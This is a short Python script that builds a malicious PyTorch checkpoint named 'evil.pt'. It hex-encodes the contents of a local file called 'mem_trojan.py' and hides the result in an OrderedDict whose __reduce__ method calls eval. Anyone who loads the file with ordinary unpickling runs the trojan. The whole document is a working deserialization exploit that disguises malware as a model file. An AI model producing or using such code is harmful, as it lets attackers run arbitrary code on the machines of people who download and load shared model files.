from collections import OrderedDict
from pathlib import Path

import torch

payload = (Path(__file__).parent / "mem_trojan.py").read_bytes()
encoded_payload = "b'%s'" % "".join(f"\\x{byte:02x}" for byte in payload)

payload_code = f'exec(compile({encoded_payload}, "<string>", "exec"))'


dic = OrderedDict()
dic.__reduce__ = lambda: (
    eval,
    (payload_code,),
)


torch.save(dic, "evil.pt")
